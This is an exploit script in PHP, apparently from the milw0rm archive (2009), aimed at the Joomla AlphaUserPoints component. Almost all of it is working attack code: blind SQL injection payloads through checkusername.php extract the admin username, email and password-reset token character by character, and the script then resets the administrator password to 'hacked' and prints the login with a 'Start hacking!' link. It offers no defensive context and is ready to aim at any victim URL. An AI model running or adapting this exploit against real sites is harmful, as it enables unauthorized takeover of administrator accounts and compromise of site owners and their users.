<html><head><title>Joomla Component AlphaUserPoints SQL Injection Exploit</title></head><pre>&lt;?php
 echo '&lt;h2&gt;Joomla Component AlphaUserPoints SQL Injection Exploit&lt;/h2&gt;';
 echo '&lt;h4&gt;jdc 2009&lt;/h4&gt;';
 echo '&lt;fieldset&gt;&lt;legend&gt;Buffer&lt;/legend&gt;&lt;div id=&quot;update&quot; style=&quot;padding:8px;&quot;&gt;&lt;/div&gt;&lt;/fieldset&gt;';
 echo '&lt;script type=&quot;text/javascript&quot;&gt;var update = document.getElementById(&quot;update&quot;);&lt;/script&gt;';
   ini_set( &quot;memory_limit&quot;, &quot;128M&quot; );
   ini_set( &quot;max_execution_time&quot;, 0 );
   set_time_limit( 0 );
   if( !isset( $_GET['url'] ) ) die( 'Usage: '.$_SERVER['SCRIPT_NAME'].'?url=www.victim.com' );
   $vulnerableFile = &quot;http://&quot;.$_GET['url'].&quot;/components/com_alphauserpoints/assets/ajax/checkusername.php&quot;;
   $url = $vulnerableFile;
 $data = array();
 $admin = '';
 $data['username2points'] = &quot;1' AND 1=2 UNION SELECT id FROM #__users WHERE gid=25 ORDER BY id ASC LIMIT 1 -- '&quot;;
 $output = getData();
 echo 'Cheching for exploit...';
 if( !testData( $output ) ) die( 'Failed. Target may have magic quotes on.' );
 echo 'done!&lt;br /&gt;';
 if( isset( $_GET['check'] ) ) die( $output );
 echo 'Getting admin username &amp; email (this may take some time)...';
 for( $i=1;$i&lt;250;$i++ )
 {
     $len = strlen( $admin );
     $continue = FALSE;
   for( $j=32; $j&lt;126; $j++ )
   {
       if( $continue ) continue;
       $data = array( 'username2points' =&gt; &quot;1' AND 1=2 UNION SELECT id FROM #__users WHERE gid=25 AND ASCII(SUBSTRING(CONCAT(username,0x3a,email),$i,1)) = $j ORDER BY id ASC LIMIT 1 -- '&quot; );
           $output = getData();
           if( testData( $output ) )
           {
             $admin .= chr( $j );
             echo '&lt;script type=&quot;text/javascript&quot;&gt;update.innerHTML += &quot;'.chr( $j ).'&quot;;&lt;/script&gt;';
             $continue = TRUE;
           }
           ob_end_flush();
           ob_flush();
           flush();
   }
   if( $len == strlen( $admin ) ) break;
 }
 if( strlen( $admin ) == 0 ) die( 'failed!' );
 echo '&lt;script type=&quot;text/javascript&quot;&gt;update.innerHTML = &quot;&quot;;&lt;/script&gt;';
 echo &quot;done!&lt;br /&gt;&quot;;
 echo &quot;&lt;h4&gt;$admin&lt;/h4&gt;&quot;;
 $admin = explode( ':', $admin );
 echo &quot;&lt;br /&gt;Generating token...&quot;;
 $url = &quot;http://&quot;.$_GET['url'].&quot;/index.php?option=com_user&amp;view=reset&amp;tmpl=component&quot;;
 $data = array();
 $token = preg_replace( array( '/\n/', '/(?:.*)name=&quot;([a-f0-9]{32})&quot;(?:.*)/m' ), array( '', '$1' ), getData() );
 if( strlen( $token ) != 32 ) die( 'failed!' );
 echo 'done!&lt;br /&gt;';
 echo 'Resetting password...';
 $url = &quot;http://&quot;.$_GET['url'].&quot;/index.php?option=com_user&amp;amp;task=requestreset&quot;;
 $data = array( 'email' =&gt; $admin[1], $token =&gt; 1 );
 getData();
 echo 'done!&lt;br /&gt;';
 echo 'Getting Reset Token...';
 $url = $vulnerableFile;
 $data = array();
 $activation = '';
 for( $i=1;$i&lt;100;$i++ )
 {
     $len = strlen( $activation );
     $continue = FALSE;
   for( $j=48; $j&lt;126; $j++ )
   {
       if( $continue ) continue;
       $data = array( 'username2points' =&gt; &quot;1' AND 1=2 UNION SELECT id FROM #__users WHERE gid=25 AND ASCII(SUBSTRING(CONCAT(activation),$i,1)) = $j ORDER BY id ASC LIMIT 1 -- '&quot; );
           $output = getData();
           if( testData( $output ) )
           {
             $activation .= chr( $j );
             echo '&lt;script type=&quot;text/javascript&quot;&gt;update.innerHTML += &quot;'.chr( $j ).'&quot;;&lt;/script&gt;';
             $continue = TRUE;
           }
           ob_end_flush();
           ob_flush();
           flush();
   }
   if( $len == strlen( $activation ) ) break;
 }
 if( strlen( $activation ) == 0 ) die( 'failed!' );
 echo 'done!&lt;br /&gt;';
 echo 'Sending Reset Token...';
 $url = &quot;http://&quot;.$_GET['url'].&quot;/index.php?option=com_user&amp;view=reset&amp;layout=complete&quot;;
 $data = array( 'token' =&gt; $activation, $token =&gt; 1 );
 getData();
 echo 'done!&lt;br /&gt;';
 echo 'Resetting Password to &quot;hacked&quot;...';
 $url = &quot;http://&quot;.$_GET['url'].&quot;/index.php?option=com_user&amp;view=reset&amp;layout=complete&quot;;
 $data = array( 'password1' =&gt; 'hacked', 'password2' =&gt; 'hacked', $token =&gt; 1 );
 getData();
 echo 'done!&lt;br /&gt;';
 echo '&lt;hr /&gt;';
 echo 'You may now log in as admin using the following credentials:&lt;br /&gt;';
 echo '&lt;strong&gt;'.$admin[0].'&lt;/strong&gt; / &lt;strong&gt;hacked&lt;/strong&gt;&lt;br /&gt;';
 echo '&lt;a href=&quot;http://'.$_GET['url'].'/administrator/&quot;&gt;Start hacking!&lt;/a&gt;';


 function shutUp( $buffer ) { return false; }
 function testData( $output ) { return preg_match( '/OK/', $output ); }
 function getData()
 {
   global $data, $url;
   ob_start( &quot;shutUp&quot; );
   $ch = curl_init();
   curl_setopt( $ch, CURL_TIMEOUT, 120 );
   curl_setopt( $ch, CURL_RETURNTRANSFER, 0 );
   curl_setopt( $ch, CURLOPT_URL, $url );
   curl_setopt( $ch, CURLOPT_COOKIEFILE, 'aup.cookie.txt' );
   curl_setopt( $ch, CURLOPT_COOKIEJAR, 'aup.cookie.txt' );
   if( count( $data ) &gt; 0 )
   {
           curl_setopt( $ch, CURLOPT_POST, count( $data ) );
           curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $data ) );
   }
   curl_setopt( $ch, CURLOPT_USERAGENT, &quot;Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)&quot; );
   curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
   $result = curl_exec( $ch );
   curl_close( $ch );
   $return = ob_get_contents();
   ob_end_clean();
   return $return;
 }

/* jdc 2009 */

# milw0rm.com [2009-09-14]</pre></html>